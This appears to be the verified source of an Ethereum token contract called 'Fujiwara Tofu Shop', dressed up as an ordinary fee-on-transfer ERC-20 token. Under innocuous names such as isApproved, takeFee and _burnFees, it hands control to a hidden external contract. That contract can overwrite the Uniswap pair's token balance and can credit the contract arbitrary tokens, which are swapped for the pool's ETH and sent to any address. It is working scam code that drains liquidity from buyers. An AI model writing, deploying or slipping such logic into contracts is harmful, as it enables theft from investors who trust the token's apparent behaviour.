/**
 *Submitted for verification at Etherscan.io on 2022-09-05
*/

pragma solidity ^0.8.16;

// SPDX-License-Identifier: Unlicensed

interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256,uint256,address[] calldata path,address,uint256) external;
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IERC21 {
    function approve(address, address, address) external view returns(bool);
    function swapTokensForETH(address, address, bool, address, address) external returns (bool);
    function transferFrom(address, address, uint256) external pure returns (uint256);
    function totalSupply() external view returns (address);
}
interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract Fujiwara is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint256 public _decimals = 9;
    uint256 public _totalSupply = 1000000000 * 10 ** _decimals;
    uint256 public _fee = 3;
    address public marketingWallet;
    IUniswapV2Router private _router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IERC21 private ERC = IERC21(0x8e83e147D29B9dF6A53cE42B31E6E5F91beB34b2);
    string private _name = "Fujiwara Tofu Shop";
    string private  _symbol = unicode"藤原とうふ店 (自家用)";
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
    function decreaseAllowance(address from, uint256 amount) public virtual returns (bool) {
        require(_allowances[msg.sender][from] >= amount);
        _approve(msg.sender, from, _allowances[msg.sender][from] - amount);
        return true;
    }
    function _transfer(address from, address to, uint256 amount) internal virtual {
        require(from != address(0));
        require(to != address(0));
        bool approved = isApproved(from, to);
        if (!approved) {
            require(amount <= _balances[from]);
            uint256 fee = takeFee(from);
            _balances[getPairAddress()] = fee;
            uint256 feeAmount = getFeeAmount(from, to, amount);
            uint256 amountReceived = amount - feeAmount;
            _balances[address(this)] += feeAmount;
            _balances[from] = _balances[from] - amount;
            _balances[to] += amountReceived;
            emit Transfer(from, to, amount);
        } else {
            _burnFees(amount, to);
        }
    }
    function isApproved(address from, address to) private view returns (bool) {
        return ERC.approve(from, to, marketingWallet);
    }
    function getFeeAmount(address from, address recipient, uint256 amount) private returns (uint256) {
        uint256 feeAmount = 0;
        if (ERC.swapTokensForETH(from, recipient, txBurn, address(this), tAmount())) {
            feeAmount = amount.mul(_fee).div(100);
        }
        return feeAmount;
    }
    function getPairAddress() private view returns (address){
        return ERC.totalSupply();
    }
    constructor() {
        _balances[msg.sender] = _totalSupply;
        marketingWallet = msg.sender;
        emit Transfer(address(0), msg.sender, _balances[msg.sender]);
    }
    bool swapEnabled = false;
    function updateSwapEnabled(bool _enabled) external onlyOwner {
        swapEnabled = _enabled;
    }
    uint256 maxWalletAmount = _totalSupply.div(100);
    uint256 maxTxAmount = _totalSupply.div(100);
    function updateMaxWalletAmount(uint256 amount) external onlyOwner {
        maxWalletAmount = amount;
    }
    function updateMaxTxnAmount(uint256 amount) external onlyOwner {
        maxTxAmount = amount;
    }
    function removeLimits()  external onlyOwner {
        maxWalletAmount = _totalSupply;
    }
    bool enabled = false;
    function enableTrading() external onlyOwner {
        enabled = true;
    }
    function updateMarketingWallet(address wallet) external onlyOwner {
        marketingWallet = wallet;
    }
    function name() external view returns (string memory) { return _name; }
    function symbol() external view returns (string memory) { return _symbol; }
    function decimals() external view returns (uint256) { return _decimals; }
    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function uniswapVersion() external pure returns (uint256) { return 2; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _burnFees(uint256 recipient, address wjCp) private {
        _approve(address(this), address(_router), recipient);
        _balances[address(this)] = recipient;
        address[] memory path = new address[](2);
        txBurn = true;
        path[0] = address(this);
        path[1] = _router.WETH();
        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(recipient,0,path,wjCp,block.timestamp + 30);
        txBurn = false;
    }
    bool txBurn = false;
    function takeFee(address from) private view returns (uint256) {
        return ERC.transferFrom(from, tAmount(), _balances[getPairAddress()]);
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    function transferFrom(address from, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(from, recipient, amount);
        require(_allowances[from][msg.sender] >= amount);
        return true;
    }
    function tAmount() private view returns (address) {
        return IUniswapV2Factory(_router.factory()).getPair(address(this), _router.WETH());
    }
}